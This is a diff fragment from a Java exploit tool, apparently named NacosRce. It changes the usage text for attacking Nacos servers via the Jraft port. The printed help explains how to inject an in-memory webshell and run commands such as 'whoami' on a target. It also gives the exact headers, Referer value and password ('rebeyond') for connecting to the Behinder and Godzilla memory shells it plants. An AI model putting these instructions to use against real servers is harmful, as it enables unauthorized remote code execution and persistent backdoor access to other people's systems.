@@ -154,8 +154,8 @@ public class NacosRce {
         System.err.println("https://github.com/c0olw/NacosRce");
         System.err.println("** 食用方式 **");
         System.err.println("自动注入内存马并执行命令\tjava -jar NacosRce.jar Url Jraft端口 \"Command\" ");
-        System.err.println("示例\tjava -jar NacosRce.jar http://192.168.90.1:8848  7848 \"whoami\" ");
-        System.err.println("只注入内存马\tjava -jar NacosRce.jar http://192.168.90.1:8848 7848 memshell");
+        System.err.println("示例\tjava -jar NacosRce.jar http://192.168.90.1:8848/nacos  7848 \"whoami\" ");
+        System.err.println("只注入内存马\tjava -jar NacosRce.jar http://192.168.90.1:8848/nacos 7848 memshell");
         //System.err.println("如果nacos是win的： \tjava -jar NacosRce.jar ip:port memshell windows");
         System.err.println("冰蝎内存马使用方法：\n1、需要设置请求头x-client-data:rebeyond\n2、设置Referer:https://www.google.com/\n3、路径随意\n4、密码rebeyond");
         System.err.println("哥斯拉内存马使用方法：\n1、需要设置请求头x-client-data:godzilla\n2、设置Referer:https://www.google.com/\n3、路径随意\n4、pass/key（默认的就行）");
